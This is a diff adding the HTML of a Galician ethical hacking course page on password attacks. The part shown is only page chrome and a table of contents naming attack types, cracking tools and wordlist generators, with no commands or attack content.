@@ -1,0 +1,5532 @@
+
+<!doctype html>
+<html lang="gl" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+      
+      
+        <link rel="prev" href="../restauracion-tty-linux/">
+      
+      
+        <link rel="next" href="../annex/john/">
+      
+      
+      <link rel="icon" href="../../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.6.22">
+    
+    
+      
+        <title>Guía - Hacking Ético - UD2 - Recoñecemento, escaneo e explotación de vulnerabilidades nos sistemas</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../../assets/stylesheets/main.84d31ad4.min.css">
+      
+        
+        <link rel="stylesheet" href="../../../assets/stylesheets/palette.06af60db.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../../../css/custom.css">
+    
+      <link rel="stylesheet" href="../../../css/opera.css">
+    
+      <link rel="stylesheet" href="../../../css/print.css">
+    
+    <script>__md_scope=new URL("../../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#ataques-a-contrasinais" class="md-skip">
+          Ir ao contido
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow md-header--lifted" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Cabeceira">
+    <a href="../../.." title="Hacking Ético - UD2 - Recoñecemento, escaneo e explotación de vulnerabilidades nos sistemas" class="md-header__button md-logo" aria-label="Hacking Ético - UD2 - Recoñecemento, escaneo e explotación de vulnerabilidades nos sistemas" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            Hacking Ético - UD2 - Recoñecemento, escaneo e explotación de vulnerabilidades nos sistemas
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Guía
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="Cambiar a modo oscuro"  type="radio" name="__palette" id="__palette_0">
+    
+      <label class="md-header__button md-icon" title="Cambiar a modo oscuro" for="__palette_1" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M17 6H7c-3.31 0-6 2.69-6 6s2.69 6 6 6h10c3.31 0 6-2.69 6-6s-2.69-6-6-6m0 10H7c-2.21 0-4-1.79-4-4s1.79-4 4-4h10c2.21 0 4 1.79 4 4s-1.79 4-4 4M7 9c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="slate" data-md-color-primary="black" data-md-color-accent="indigo"  aria-label="Cambiar a modo normal"  type="radio" name="__palette" id="__palette_1">
+    
+      <label class="md-header__button md-icon" title="Cambiar a modo normal" for="__palette_0" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M17 7H7a5 5 0 0 0-5 5 5 5 0 0 0 5 5h10a5 5 0 0 0 5-5 5 5 0 0 0-5-5m0 8a3 3 0 0 1-3-3 3 3 0 0 1 3-3 3 3 0 0 1 3 3 3 3 0 0 1-3 3"/></svg>
+      </label>
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Procura" placeholder="Procura" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Procurar">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Limpar" aria-label="Limpar" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Inicializando procura
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+  </nav>
+  
+    
+      
+<nav class="md-tabs" aria-label="Pestanas" data-md-component="tabs">
+  <div class="md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../.." class="md-tabs__link">
+        
+  
+  
+    
+  
+  De interese
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+    
+  
+  
+    
+    
+      <li class="md-tabs__item md-tabs__item--active">
+        <a href="../consideracions/" class="md-tabs__link">
+          
+  
+  
+  Apuntamentos
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../practicas-taller/vulnyx/" class="md-tabs__link">
+          
+  
+  
+  Prácticas Taller UD2
+
+        </a>
+      </li>
+    
+  
+
+    
+  
+
+      
+    </ul>
+  </div>
+</nav>
+    
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+  
+
+
+<nav class="md-nav md-nav--primary md-nav--lifted" aria-label="Navegación" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../../.." title="Hacking Ético - UD2 - Recoñecemento, escaneo e explotación de vulnerabilidades nos sistemas" class="md-nav__button md-logo" aria-label="Hacking Ético - UD2 - Recoñecemento, escaneo e explotación de vulnerabilidades nos sistemas" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    Hacking Ético - UD2 - Recoñecemento, escaneo e explotación de vulnerabilidades nos sistemas
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../.." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    De interese
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    Apuntamentos
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            Apuntamentos
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../consideracions/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Consideracións
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_2" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_2_2" id="__nav_2_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Tips
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_2_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_2_2">
+            <span class="md-nav__icon md-icon"></span>
+            Tips
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../restauracion-tty-linux/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    TTY non interactiva
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_2_2" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_2_2_2" id="__nav_2_2_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Ataques a contrasinais
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_2_2_2_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_2_2_2">
+            <span class="md-nav__icon md-icon"></span>
+            Ataques a contrasinais
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    Guía
+    
+  </span>
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  
+  <span class="md-ellipsis">
+    Guía
+    
+  </span>
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Táboa de contidos">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Táboa de contidos
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#indice" class="md-nav__link">
+    <span class="md-ellipsis">
+      Índice
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#tipos-de-ataques-comuns" class="md-nav__link">
+    <span class="md-ellipsis">
+      Tipos de ataques comúns
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Tipos de ataques comúns">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#1-ataques-online-autenticacion-remota" class="md-nav__link">
+    <span class="md-ellipsis">
+      1. Ataques online (autenticación remota)
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2-ataques-offline-sobre-hashes" class="md-nav__link">
+    <span class="md-ellipsis">
+      2. Ataques offline (sobre hashes)
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3-ataques-por-formulacion-parsing-avanzado" class="md-nav__link">
+    <span class="md-ellipsis">
+      3. Ataques por formulación / parsing avanzado
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#4-password-spraying" class="md-nav__link">
+    <span class="md-ellipsis">
+      4. Password spraying
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#5-credential-stuffing" class="md-nav__link">
+    <span class="md-ellipsis">
+      5. Credential stuffing
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#6-ataques-especificos-de-vectores" class="md-nav__link">
+    <span class="md-ellipsis">
+      6. Ataques específicos de vectores
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#taxonomia-e-vectores" class="md-nav__link">
+    <span class="md-ellipsis">
+      Taxonomía e vectores
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#ferramentas-e-exemplos-por-tipoprotocolo" class="md-nav__link">
+    <span class="md-ellipsis">
+      Ferramentas e exemplos por tipo/protocolo
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Ferramentas e exemplos por tipo/protocolo">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#ataques-online-multi-protocolo" class="md-nav__link">
+    <span class="md-ellipsis">
+      Ataques online — multi-protocolo
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#john-the-ripper-offline-diccionario-regras-incremental" class="md-nav__link">
+    <span class="md-ellipsis">
+      John the Ripper (offline — diccionario + regras / incremental)
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#hashcat-offline-gpucpu-dictionary-mask-hybrid" class="md-nav__link">
+    <span class="md-ellipsis">
+      Hashcat (offline GPU/CPU — dictionary, mask, hybrid)
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#wordlists-recomendadas" class="md-nav__link">
+    <span class="md-ellipsis">
+      Wordlists recomendadas
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Wordlists recomendadas">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#1-rockyou" class="md-nav__link">
+    <span class="md-ellipsis">
+      1. rockyou
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2-kaonashi" class="md-nav__link">
+    <span class="md-ellipsis">
+      2. Kaonashi
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3-seclists" class="md-nav__link">
+    <span class="md-ellipsis">
+      3. SecLists
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#4-wordlists-de-kali-linux-usrsharewordlists" class="md-nav__link">
+    <span class="md-ellipsis">
+      4. Wordlists de Kali Linux (/usr/share/wordlists)
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#xeracion-de-wordlists" class="md-nav__link">
+    <span class="md-ellipsis">
+      Xeración de Wordlists
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Xeración de Wordlists">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#1-cewl-custom-word-list-generator" class="md-nav__link">
+    <span class="md-ellipsis">
+      1. CeWL (Custom Word List generator)
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="1. CeWL (Custom Word List generator)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#caracteristicas-principais" class="md-nav__link">
+    <span class="md-ellipsis">
+      Características principais:
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#exemplos-de-uso" class="md-nav__link">
+    <span class="md-ellipsis">
+      Exemplos de uso:
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2-crunch-pattern-based-wordlist-generator" class="md-nav__link">
+    <span class="md-ellipsis">
+      2. Crunch (Pattern-based wordlist generator)
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="2. Crunch (Pattern-based wordlist generator)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#caracteristicas-principais_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      Características principais:
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#sintaxe-basica" class="md-nav__link">
+    <span class="md-ellipsis">
+      Sintaxe básica:
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#exemplos-de-uso_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      Exemplos de uso:
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3-cupp-common-user-passwords-profiler" class="md-nav__link">
+    <span class="md-ellipsis">
+      3. CUPP (Common User Passwords Profiler)
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="3. CUPP (Common User Passwords Profiler)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#caracteristicas-principais_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      Características principais:
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#exemplos-de-uso_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      Exemplos de uso:
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#taboa-comparativa-de-ferramentas" class="md-nav__link">
+    <span class="md-ellipsis">
+      Táboa comparativa de ferramentas
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#workflow-recomendado-para-xeracion-de-wordlists" class="md-nav__link">
+    <span class="md-ellipsis">
+      Workflow recomendado para xeración de wordlists
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#creditos-e-bibliografia" class="md-nav__link">
+    <span class="md-ellipsis">
+      Créditos e bibliografía
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_2_2_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_2_2_2" id="__nav_2_2_2_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Ferramentas
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="4" aria-labelledby="__nav_2_2_2_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_2_2_2">
+            <span class="md-nav__icon md-icon"></span>
+            Ferramentas
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../annex/john/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    john
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../annex/hashcat/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    hashcat
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../annex/hydra/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    hydra
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../PHP-wrappers/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    PHP wrappers
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_2_4" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_2_4" id="__nav_2_2_4_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Windows
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_2_2_4_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_2_4">
+            <span class="md-nav__icon md-icon"></span>
+            Windows
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../tips/referencias/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Referencias
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_2_4_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_2_4_2" id="__nav_2_2_4_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Seguridade de credenciais
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="4" aria-labelledby="__nav_2_2_4_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_2_4_2">
+            <span class="md-nav__icon md-icon"></span>
+            Seguridade de credenciais
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../tips/hashes-Windows/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Hashes
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../tips/responder/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    responder
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../tips/mimikatz/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    mimikatz
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../tips/privilexios-windows/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Privilexios Clave e Métodos de Explotación
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../tips/ataques-kerberos/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Ataques Kerberos
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../tips/sharphound-bloodhound/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    SharpHound/BloodHound
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_3" id="__nav_2_3_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Fase 1. Recopilación
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_3">
+            <span class="md-nav__icon md-icon"></span>
+            Fase 1. Recopilación
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../comandos-tipo-fase1/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Comandos
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../arp-scan/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    arp-scan
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ping/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    ping
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_3_4" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_3_4" id="__nav_2_3_4_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    nmap
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_2_3_4_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_3_4">
+            <span class="md-nav__icon md-icon"></span>
+            nmap
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../nmap/" class="md-nav__link">
+        
+  
